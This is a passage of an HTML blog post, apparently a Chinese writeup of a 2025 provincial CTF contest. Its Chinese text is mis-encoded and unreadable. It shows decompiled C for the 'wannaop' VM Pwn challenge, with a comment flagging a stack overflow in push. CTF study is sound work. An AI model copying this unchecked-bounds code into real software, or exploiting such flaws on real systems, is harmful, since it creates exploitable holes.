<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "åˆ‡æ¢ä¸ºæµ…è‰²ä¸»é¢˜" : "åˆ‡æ¢ä¸ºæ·±è‰²ä¸»é¢˜");
            if (label) {
                label.textContent = isDark ? "æ·±è‰²" : "æµ…è‰²";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>2025 å¹´å››å·çœçœèµ› Writeup | èŠ±ç›†</title><meta name="author" content="LittFlower"/><meta name="description" content="2025 å¹´å››å·çœçœèµ› CTF ä¸ AWDP é¢˜è§£"/><meta property="og:title" content="2025 å¹´å››å·çœçœèµ› Writeup | èŠ±ç›†"/><meta property="og:description" content="2025 å¹´å››å·çœçœèµ› CTF ä¸ AWDP é¢˜è§£"/><meta property="og:site_name" content="èŠ±ç›†"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/SiChuanCompetion2025-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="èŠ±ç›†" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>å†…å®¹</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>å›åˆ°é¡¶éƒ¨</a></h3><button type="button" data-theme-toggle="true" aria-label="åˆ‡æ¢äº®æš—ä¸»é¢˜" aria-pressed="false" title="åˆ‡æ¢ä¸»é¢˜" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>Â Â <span data-theme-toggle-label="true" class="theme-toggle-label">æµ…è‰²</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="2025-writeup" class="scroll-target"><a href="#2025-writeup"><code class="hash inline-code">#</code>2025 å¹´å››å·çœçœèµ› Writeup</a></h1>
<blockquote>
<p>å“¦è€¶ ğŸ˜ æˆ‘ä»¬æ˜¯å† å†›ï¼</p>
</blockquote>
<p>å››å·çœèµ›ä¸€èˆ¬éƒ½æ˜¯æ‰“ä¸¤å¤©ï¼Œçº¿ä¸‹æ–­ç½‘æ¯”èµ›ï¼Œç¬¬ä¸€å¤© CTF jp èµ›åˆ¶ï¼Œç¬¬äºŒå¤©å°±æ˜¯ awdpï¼Œæœ€ç»ˆæŠŠä¸¤å¤©å½’ä¸€åŒ–å¾—åˆ†æ’åã€‚</p>
<p>è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹ awdp éƒ¨åˆ†ï¼Œå› ä¸ºå¹³å¸¸ awdp çº¿ä¸‹æ‰“çš„æœºä¼šä¸æ˜¯å¾ˆå¤šï¼Œæ¯æ¬¡èµ›å‰éƒ½ä¼šæ‰‹å¿™è„šä¹±åœ°æ•´ç†å¥½ä¹…ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—å¥½å¥½è®°å½•ä¸€ä¸‹ã€‚å¦å¤–æ˜å¹´å‡å¦‚æœ‰å­¦å¼Ÿæ¥æ‰“çš„è¯ï¼Œæ„Ÿè§‰ä¹Ÿå¯ä»¥æ–¹ä¾¿ä»–ä»¬ã€‚</p>
<h2 id="day1" class="scroll-target"><a href="#day1"><code class="hash inline-code">#</code>Day1</a></h2>
<p><del>ä½†æ˜¯ CTF èµ›åˆ¶ä¹Ÿæ˜¯è¦ç®€å•è®°å½•ä¸€ä¸‹çš„</del></p>
<p>ç¬¬ä¸€å¤©çš„ JP èµ›åˆ¶çš„ Pwn é¢˜çœŸæ˜¯çº¯ğŸ’©ï¼Œç»™æˆ‘æ¶å¿ƒåäº†ï¼Œæˆ‘ä¸€å…±è§£å‡ºäº†ä¸¤é“ Pwn é¢˜åŠ ä¸€é“é€†å‘é¢˜ã€‚</p>
<h3 id="pwn" class="scroll-target"><a href="#pwn"><code class="hash inline-code">#</code>Pwn</a></h3>
<h4 id="wannaop" class="scroll-target"><a href="#wannaop"><code class="hash inline-code">#</code>wannaop</a></h4>
<p>VM Pwnï¼Œæˆ‘åŸºæœ¬ä¸Šé€ä¸ªå‡½æ•°è¿˜åŸäº†ï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">solve</span><span style="color:#2993a3">(</span><span style="color:#393A34">__int64 </span><span style="color:#B07D48">vm</span><span style="color:#999999">,</span><span style="color:#AB5959"> unsigned</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> op1</span><span style="color:#999999">,</span><span style="color:#AB5959"> unsigned</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> op2</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v4</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+20h] [rbp-8h]</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v5</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+20h] [rbp-8h]</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> int</span><span style="color:#393A34"> v6</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+20h] [rbp-8h]</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v7</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+24h] [rbp-4h]</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v8</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+24h] [rbp-4h]</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v9</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+24h] [rbp-4h]</span><br><br><span style="color:#393A34">  result </span><span style="color:#999999">=</span><span style="color:#393A34"> op1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  switch</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> op1 </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#59873A">      push</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#999999">,</span><span style="color:#393A34"> op2</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#59873A">      pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#393A34">      v4 </span><span style="color:#999999">=</span><span style="color:#59873A"> pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v7 </span><span style="color:#999999">=</span><span style="color:#59873A"> pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">      push</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">unsigned</span><span style="color:#AB5959"> int</span><span style="color:#a13865">)</span><span style="color:#a13865">(</span><span style="color:#393A34">v7 </span><span style="color:#AB5959">+</span><span style="color:#393A34"> v4</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 3</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#393A34">      v5 </span><span style="color:#999999">=</span><span style="color:#59873A"> pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v8 </span><span style="color:#999999">=</span><span style="color:#59873A"> pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">      push</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">unsigned</span><span style="color:#AB5959"> int</span><span style="color:#a13865">)</span><span style="color:#a13865">(</span><span style="color:#393A34">v5 </span><span style="color:#AB5959">-</span><span style="color:#393A34"> v8</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 4</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#393A34">      v6 </span><span style="color:#999999">=</span><span style="color:#59873A"> pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v9 </span><span style="color:#999999">=</span><span style="color:#59873A"> pop</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">      push</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#999999">,</span><span style="color:#393A34"> v9 </span><span style="color:#AB5959">^</span><span style="color:#393A34"> v6</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 5</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#1E754F">      return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 6</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#59873A">      store</span><span style="color:#a65e2b">(</span><span style="color:#393A34">vm</span><span style="color:#999999">,</span><span style="color:#393A34"> op2</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    case</span><span style="color:#2F798A"> 7</span><span style="color:#AB5959">u</span><span style="color:#999999">:</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    default</span><span style="color:#999999">:</span><br><span style="color:#59873A">      puts</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">err opcode!</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">pop</span><span style="color:#2993a3">(</span><span style="color:#393A34">vm </span><span style="color:#AB5959">*</span><span style="color:#B07D48">a1</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> sp</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // eax</span><br><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48"> a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sp</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 0</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">    puts</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">error!</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    sp </span><span style="color:#999999">=</span><span style="color:#B07D48"> a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sp</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sp</span><span style="color:#999999"> =</span><span style="color:#393A34"> sp </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">unsigned</span><span style="color:#AB5959"> int</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">&#x26;</span><span style="color:#B07D48">a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">stack</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">4</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> sp</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#393A34"> __fastcall </span><span style="color:#59873A">push</span><span style="color:#2993a3">(</span><span style="color:#393A34">vm </span><span style="color:#AB5959">*</span><span style="color:#B07D48">a1</span><span style="color:#999999">,</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> a2</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // eax</span><br><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48"> a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sp</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 343</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">error!</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  ++</span><span style="color:#B07D48">a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sp</span><span style="color:#999999">;</span><br><span style="color:#393A34">  result </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">int</span><span style="color:#1e754f">)</span><span style="color:#393A34">a1</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  *</span><span style="color:#1e754f">(</span><span style="color:#393A34">_DWORD </span><span style="color:#AB5959">*</span><span style="color:#1e754f">)</span><span style="color:#AB5959">&#x26;</span><span style="color:#B07D48">a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">stack</span><span style="color:#1e754f">[</span><span style="color:#2F798A">4</span><span style="color:#AB5959"> *</span><span style="color:#B07D48"> a1</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sp</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#393A34"> a2</span><span style="color:#999999">;</span><span style="color:#A0ADA0">       // stack overflow</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#DBD7CAEE">__int64 __fastcall </span><span style="color:#80A665">solve</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">__int64 </span><span style="color:#BD976A">vm</span><span style="color:#666666">,</span><span style="color:#CB7676"> unsigned</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> op1</span><span style="color:#666666">,</span><span style="color:#CB7676"> unsigned</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> op2</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  __int64 result</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rax</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v4</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+20h] [rbp-8h]</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v5</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+20h] [rbp-8h]</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> v6</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+20h] [rbp-8h]</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v7</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+24h] [rbp-4h]</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v8</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+24h] [rbp-4h]</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v9</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+24h] [rbp-4h]</span><br><br><span style="color:#DBD7CAEE">  result </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> op1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  switch</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> op1 </span><span style="color:#4d9375">)</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#80A665">      push</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#80A665">      pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">      v4 </span><span style="color:#666666">=</span><span style="color:#80A665"> pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">      v7 </span><span style="color:#666666">=</span><span style="color:#80A665"> pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">      push</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> int</span><span style="color:#d9739f">)</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">v7 </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> v4</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 3</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">      v5 </span><span style="color:#666666">=</span><span style="color:#80A665"> pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">      v8 </span><span style="color:#666666">=</span><span style="color:#80A665"> pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">      push</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> int</span><span style="color:#d9739f">)</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">v5 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> v8</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 4</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">      v6 </span><span style="color:#666666">=</span><span style="color:#80A665"> pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">      v9 </span><span style="color:#666666">=</span><span style="color:#80A665"> pop</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">      push</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v9 </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> v6</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 5</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#4D9375">      return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 6</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#80A665">      store</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">vm</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    case</span><span style="color:#4C9A91"> 7</span><span style="color:#CB7676">u</span><span style="color:#666666">:</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    default</span><span style="color:#666666">:</span><br><span style="color:#80A665">      puts</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">err opcode!</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#DBD7CAEE">__int64 __fastcall </span><span style="color:#80A665">pop</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">vm </span><span style="color:#CB7676">*</span><span style="color:#BD976A">a1</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> sp</span><span style="color:#666666">;</span><span style="color:#758575DD"> // eax</span><br><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A"> a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sp</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">    puts</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">error!</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">  else</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">    sp </span><span style="color:#666666">=</span><span style="color:#BD976A"> a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sp</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sp</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> sp </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#CB7676"> *</span><span style="color:#d4976c">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> int</span><span style="color:#CB7676"> *</span><span style="color:#d4976c">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#BD976A">a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">stack</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">4</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> sp</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> __fastcall </span><span style="color:#80A665">push</span><span 